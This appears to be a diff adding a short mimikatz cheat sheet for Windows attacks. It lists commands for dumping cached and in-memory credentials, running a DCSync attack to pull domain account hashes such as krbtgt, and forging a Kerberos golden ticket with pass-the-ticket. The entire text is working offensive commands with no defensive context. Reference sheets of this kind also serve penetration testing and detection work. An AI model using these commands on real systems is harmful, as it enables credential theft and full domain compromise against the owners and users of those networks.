@@ -1,0 +1,14 @@
+Dump cached credentials on Windows system:
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::cache
+
+Dump all credentials in memory on Windows system:
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonPasswords
+
+DCSync attack on Windows Domain:
+mimikatz # lsadump::dcsync /user:<username> (ex..krbtgt)
+
+Golden Ticket Attack:
+mimikatz # kerberos::golden /domain:<domain.name> /sid:<username SID> /rc4:<NTLM Hash> /user:<username> /ptt
